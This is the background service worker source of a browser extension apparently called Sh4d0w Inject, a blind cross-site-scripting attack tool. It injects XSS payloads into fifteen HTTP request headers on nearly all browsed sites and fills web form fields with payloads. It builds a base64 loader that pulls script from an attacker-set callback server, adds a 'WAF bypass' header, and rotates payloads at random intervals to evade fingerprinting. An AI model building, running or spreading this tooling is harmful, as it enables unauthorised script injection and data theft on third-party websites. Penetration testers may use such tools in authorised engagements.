/**
 * Sh4d0w Inject v4.0 — Background Service Worker
 * Users configure their own blind XSS server in Settings
 * {{SERVER}} in payloads is replaced at runtime
 *
 * v4.0 Changelog:
 * - 8 NEW injectable headers (X-Real-IP, True-Client-IP, X-Client-IP, etc.)
 * - Randomized payload rotation (2-10s intervals)
 * - Wildcard domain exclusion support (*.google.com)
 * - Extension icon badge counter for active headers
 * - Master switch support (all headers ON/OFF)
 */

// Chrome service_worker needs importScripts; Firefox background.scripts loads via manifest
try { importScripts('../lib/payloads.js'); } catch (e) { /* loaded via manifest scripts */ }

// =============================
// All Injectable Headers (v4.0: 15 total)
// =============================
const INJECTABLE_HEADERS = [
    // Original 7 headers
    { id: 'user-agent', label: 'User-Agent', icon: '🌐' },
    { id: 'referer', label: 'Referer', icon: '🔗' },
    { id: 'origin', label: 'Origin', icon: '📍' },
    { id: 'cookie', label: 'Cookie', icon: '🍪' },
    { id: 'accept', label: 'Accept', icon: '📥' },
    { id: 'x-forwarded-for', label: 'X-Forwarded-For', icon: '🔀' },
    { id: 'waf-bypass', label: 'Content-Encoding', icon: '🤐' },
    // v4.0: 8 NEW headers
    { id: 'x-real-ip', label: 'X-Real-IP', icon: '🖥️' },
    { id: 'true-client-ip', label: 'True-Client-IP', icon: '☁️' },
    { id: 'x-client-ip', label: 'X-Client-IP', icon: '🔌' },
    { id: 'x-originating-ip', label: 'X-Originating-IP', icon: '📨' },
    { id: 'contact', label: 'Contact', icon: '📞' },
    { id: 'from', label: 'From', icon: '✉️' },
    { id: 'x-wap-profile', label: 'X-Wap-Profile', icon: '📱' },
    { id: 'x-custom-ip-authorization', label: 'X-Custom-IP-Authorization', icon: '🔑' }
];

const DEFAULT_EXCLUDED = [
    'google.com', 'google.co.in', 'google.co.uk',
    'web.whatsapp.com', 'whatsapp.com',
    'open.spotify.com', 'spotify.com',
    'youtube.com', 'mail.google.com',
    'github.com', 'stackoverflow.com',
    'facebook.com', 'instagram.com',
    'twitter.com', 'x.com',
    'linkedin.com', 'reddit.com',
    'chrome.google.com', 'addons.mozilla.org'
];

// v4.0: Session injection counter
let sessionInjectionCount = 0;

// =============================
// Install & Init
// =============================
chrome.runtime.onInstalled.addListener(() => {
    chrome.contextMenus.create({ id: 'sh4d0w-parent', title: '💉 Sh4d0w Inject', contexts: ['all'] });
    chrome.contextMenus.create({ id: 'sh4d0w-fill-field', parentId: 'sh4d0w-parent', title: '🎯 Fill This Field', contexts: ['editable'] });
    chrome.contextMenus.create({ id: 'sh4d0w-fill-all', parentId: 'sh4d0w-parent', title: '⚡ Fill ALL Fields', contexts: ['all'] });
    chrome.contextMenus.create({ id: 'sh4d0w-sep1', parentId: 'sh4d0w-parent', type: 'separator', contexts: ['all'] });
    chrome.contextMenus.create({ id: 'sh4d0w-exclude', parentId: 'sh4d0w-parent', title: '🚫 Exclude This Site', contexts: ['all'] });
    chrome.contextMenus.create({ id: 'sh4d0w-options', parentId: 'sh4d0w-parent', title: '⚙️ Settings', contexts: ['all'] });

    chrome.storage.sync.get(null, (r) => {
        const defaultToggles = {};
        INJECTABLE_HEADERS.forEach(h => {
            defaultToggles[h.id] = (r.headerToggles && r.headerToggles[h.id]) || false;
        });

        const defaults = {
            serverUrl: r.serverUrl || '',
            fillHistory: r.fillHistory || [],
            enabledTypes: r.enabledTypes || {
                name: true, email: true, phone: true, url: true,
                subject: true, message: true, address: true,
                company: true, search: true, generic: true
            },
            headerToggles: defaultToggles,
            excludedDomains: r.excludedDomains || DEFAULT_EXCLUDED,
            popupState: r.popupState || { activeTab: 'fill', targetDomain: '', lastScanResult: null },
            stealthMode: r.stealthMode || false
        };
        chrome.storage.sync.set(defaults);
        if (r.headerToggles && Object.values(r.headerToggles).some(v => v)) {
            rebuildHeaderRules();
        }
    });
});

// =============================
// Context Menu
// =============================
chrome.contextMenus.onClicked.addListener(async (info, tab) => {
    if (info.menuItemId === 'sh4d0w-fill-field') await injectAndFill(tab.id, 'fillField');
    else if (info.menuItemId === 'sh4d0w-fill-all') { await injectAndFill(tab.id, 'fillAll'); addToHistory(tab.url, tab.title, -1); }
    else if (info.menuItemId === 'sh4d0w-exclude') { try { addExcludedDomain(new URL(tab.url).hostname); } catch (e) { } }
    else if (info.menuItemId === 'sh4d0w-options') chrome.runtime.openOptionsPage();
});

// =============================
// On-Demand Inject — injects server URL before content script
// =============================
async function injectAndFill(tabId, action) {
    try {
        const data = await chrome.storage.sync.get(['serverUrl', 'stealthMode']);

        // First inject the server URL and stealth mode as global variables
        await chrome.scripting.executeScript({
            target: { tabId },
            func: (url, stealth) => {
                window.__SH4D0W_SERVER = url;
                window.__SH4D0W_STEALTH = stealth;
            },
            args: [data.serverUrl || '', data.stealthMode || false]
        });

        // Then inject payloads + content script
        await chrome.scripting.executeScript({
            target: { tabId }, files: ['lib/payloads.js', 'content/content.js']
        });
        await new Promise(r => setTimeout(r, 80));
        const result = await chrome.tabs.sendMessage(tabId, { action });

        // v4.0: Update session counter
        if (result && result.filled > 0) {
            sessionInjectionCount += result.filled;
            updateBadge();
        }

        return result;
    } catch (e) {
        console.error('Sh4d0w:', e);
        return null;
    }
}

// =============================
// v4.0: Extension Badge Counter
// =============================
function updateBadge() {
    chrome.storage.sync.get(['headerToggles'], (r) => {
        const toggles = r.headerToggles || {};
        const activeCount = Object.values(toggles).filter(v => v).length;

        if (activeCount > 0) {
            chrome.action.setBadgeText({ text: String(activeCount) });
            chrome.action.setBadgeBackgroundColor({ color: '#00ff41' });
        } else if (sessionInjectionCount > 0) {
            chrome.action.setBadgeText({ text: String(sessionInjectionCount) });
            chrome.action.setBadgeBackgroundColor({ color: '#00d4ff' });
        } else {
            chrome.action.setBadgeText({ text: '' });
        }
    });
}

// =============================
// Messages
// =============================
chrome.runtime.onMessage.addListener((msg, sender, reply) => {
    if (msg.action === 'injectAndFillAll') {
        (async () => {
            const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
            if (!tab) return reply({ filled: 0, total: 0 });
            const r = await injectAndFill(tab.id, 'fillAll');
            if (r) addToHistory(tab.url, tab.title, r.filled || 0);
            reply(r || { filled: 0, total: 0 });
        })();
        return true;
    }

    if (msg.action === 'injectAndCount') {
        (async () => {
            const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
            if (!tab) return reply({ total: 0, byType: {} });
            try {
                const data = await chrome.storage.sync.get(['serverUrl', 'stealthMode']);
                await chrome.scripting.executeScript({
                    target: { tabId: tab.id },
                    func: (url, stealth) => {
                        window.__SH4D0W_SERVER = url;
                        window.__SH4D0W_STEALTH = stealth;
                    },
                    args: [data.serverUrl || '', data.stealthMode || false]
                });
                await chrome.scripting.executeScript({
                    target: { tabId: tab.id }, files: ['lib/payloads.js', 'content/content.js']
                });
                await new Promise(r => setTimeout(r, 80));
                const r = await chrome.tabs.sendMessage(tab.id, { action: 'countFields' });
                reply(r || { total: 0, byType: {} });
            } catch (e) { reply({ total: 0, byType: {}, error: e.message }); }
        })();
        return true;
    }

    if (msg.action === 'getHeaderToggles') {
        chrome.storage.sync.get(['headerToggles'], r => reply({ toggles: r.headerToggles || {} }));
        return true;
    }

    if (msg.action === 'setHeaderToggle') {
        chrome.storage.sync.get(['headerToggles'], async (r) => {
            const t = r.headerToggles || {};
            t[msg.headerId] = msg.enabled;
            chrome.storage.sync.set({ headerToggles: t });
            await rebuildHeaderRules();
            updateBadge();
            reply({ toggles: t });
        });
        return true;
    }

    // v4.0: Master Switch — all headers ON or OFF
    if (msg.action === 'masterSwitch') {
        chrome.storage.sync.get(['headerToggles'], async (r) => {
            const t = r.headerToggles || {};
            INJECTABLE_HEADERS.forEach(h => {
                t[h.id] = msg.enabled;
            });
            chrome.storage.sync.set({ headerToggles: t });
            await rebuildHeaderRules();
            updateBadge();
            reply({ toggles: t });
        });
        return true;
    }

    // v4.0: Get stats
    if (msg.action === 'getStats') {
        chrome.storage.sync.get(['headerToggles', 'fillHistory'], (r) => {
            const toggles = r.headerToggles || {};
            const history = r.fillHistory || [];
            const activeHeaders = Object.values(toggles).filter(v => v).length;
            const totalPayloads = Object.values(BLINDXSS_PAYLOADS.payloadsByType).reduce((sum, arr) => sum + arr.length, 0);
            const sitesInjected = new Set(history.map(h => { try { return new URL(h.url).hostname; } catch(e) { return h.url; } })).size;
            reply({
                activeHeaders,
                totalPayloads,
                sitesInjected,
                sessionFills: sessionInjectionCount
            });
        });
        return true;
    }

    if (msg.action === 'getExcludedDomains') {
        chrome.storage.sync.get(['excludedDomains'], r => reply({ domains: r.excludedDomains || [] }));
        return true;
    }
    if (msg.action === 'addExcludedDomain') {
        addExcludedDomain(msg.domain).then(d => reply({ domains: d }));
        return true;
    }
    if (msg.action === 'removeExcludedDomain') {
        chrome.storage.sync.get(['excludedDomains'], async (r) => {
            const d = (r.excludedDomains || []).filter(x => x !== msg.domain);
            chrome.storage.sync.set({ excludedDomains: d });
            await rebuildHeaderRules();
            reply({ domains: d });
        });
        return true;
    }
    if (msg.action === 'resetExcludedDomains') {
        chrome.storage.sync.set({ excludedDomains: DEFAULT_EXCLUDED }, async () => {
            await rebuildHeaderRules();
            reply({ domains: DEFAULT_EXCLUDED });
        });
        return true;
    }

    if (msg.action === 'getServerUrl') {
        chrome.storage.sync.get(['serverUrl'], r => reply({ serverUrl: r.serverUrl || '' }));
        return true;
    }
    if (msg.action === 'setServerUrl') {
        chrome.storage.sync.set({ serverUrl: msg.url });
        reply({ ok: true });
        return true;
    }
});

async function addExcludedDomain(domain) {
    return new Promise(resolve => {
        const clean = domain.replace(/^https?:\/\//, '').replace(/^www\./, '').replace(/\/$/, '').toLowerCase();
        if (!clean) return resolve([]);
        chrome.storage.sync.get(['excludedDomains'], async (r) => {
            const d = r.excludedDomains || [];
            if (!d.includes(clean)) { d.push(clean); d.sort(); chrome.storage.sync.set({ excludedDomains: d }); await rebuildHeaderRules(); }
            resolve(d);
        });
    });
}

// =============================
// v4.0: Wildcard Domain Matching
// =============================
function isDomainExcluded(hostname, excludedDomains) {
    return excludedDomains.some(d => {
        if (d.startsWith('*.')) {
            const base = d.slice(2);
            return hostname === base || hostname.endsWith('.' + base);
        }
        return hostname === d || hostname === 'www.' + d;
    });
}

// =============================
// Multi-Header Injection — uses user's server URL
// v4.0: Randomized rotation, wildcard exclusions
// =============================
let headerPayloadIndices = {};
let rotationTimer = null;

async function rebuildHeaderRules() {
    const data = await chrome.storage.sync.get(['headerToggles', 'excludedDomains', 'serverUrl']);
    const toggles = data.headerToggles || {};
    const excluded = data.excludedDomains || [];
    const serverUrl = data.serverUrl || '';
    const payloads = BLINDXSS_PAYLOADS.headerPayloads;

    const requestHeaders = [];
    for (const h of INJECTABLE_HEADERS) {
        if (!toggles[h.id]) continue;

        // Special case for WAF Bypass (static gzip value)
        if (h.id === 'waf-bypass') {
            requestHeaders.push({ header: h.label, operation: 'set', value: 'gzip' });
            continue;
        }

        const pool = payloads[h.id] || payloads['generic'];
        const idx = (headerPayloadIndices[h.id] || 0) % pool.length;
        let payload = pool[idx];
        if (serverUrl) payload = payload.replace(/\{\{SERVER\}\}/g, serverUrl);
        // v4.0: Also resolve LOADER_B64
        if (payload.includes('{{LOADER_B64}}') && serverUrl) {
            const loaderCode = 'var a=document.createElement("script");a.src="' + serverUrl + '";document.body.appendChild(a);';
            try { payload = payload.replace(/\{\{LOADER_B64\}\}/g, btoa(loaderCode)); } catch(e) {}
        }
        requestHeaders.push({ header: h.label, operation: 'set', value: payload });
    }

    try {
        const existing = await chrome.declarativeNetRequest.getDynamicRules();
        const oldIds = existing.map(r => r.id);

        if (requestHeaders.length === 0) {
            await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: oldIds, addRules: [] });
            if (rotationTimer) { clearInterval(rotationTimer); rotationTimer = null; }
            updateBadge();
            return;
        }

        // v4.0: Wildcard-aware exclusion — filter to simple domain strings for declarativeNetRequest
        // (the API only supports exact domain matching, so wildcards are handled separately)
        const simpleDomains = excluded.filter(d => !d.startsWith('*.'));

        const condition = {
            urlFilter: '*',
            resourceTypes: ['main_frame', 'sub_frame', 'xmlhttprequest', 'script', 'image', 'stylesheet', 'font', 'media', 'websocket', 'other']
        };
        if (simpleDomains.length > 0) condition.excludedRequestDomains = simpleDomains;

        await chrome.declarativeNetRequest.updateDynamicRules({
            removeRuleIds: oldIds,
            addRules: [{ id: 1, priority: 1, action: { type: 'modifyHeaders', requestHeaders }, condition }]
        });

        // v4.0: Randomized rotation interval (2-10 seconds)
        if (!rotationTimer) {
            scheduleRandomRotation();
        }
        updateBadge();
    } catch (e) { console.error('Sh4d0w: rule error:', e); }
}

// v4.0: Randomized rotation — harder to fingerprint
function scheduleRandomRotation() {
    if (rotationTimer) clearTimeout(rotationTimer);
    const delay = 2000 + Math.floor(Math.random() * 8000); // 2-10 seconds
    rotationTimer = setTimeout(() => {
        rotateHeaders();
        scheduleRandomRotation(); // Schedule next with new random delay
    }, delay);
}

function rotateHeaders() {
    for (const h of INJECTABLE_HEADERS) headerPayloadIndices[h.id] = ((headerPayloadIndices[h.id] || 0) + 1);
    rebuildHeaderRules();
}

chrome.webNavigation.onCommitted.addListener(async (details) => {
    if (details.frameId !== 0) return;
    const { headerToggles } = await chrome.storage.sync.get(['headerToggles']);
    if (Object.values(headerToggles || {}).some(v => v)) rotateHeaders();
});

// =============================
// History
// =============================
function addToHistory(url, title, count) {
    chrome.storage.sync.get(['fillHistory'], (r) => {
        const h = r.fillHistory || [];
        h.unshift({ url, title: title || url, fields: count, timestamp: Date.now() });
        if (h.length > 50) h.length = 50;
        chrome.storage.sync.set({ fillHistory: h });
    });
}
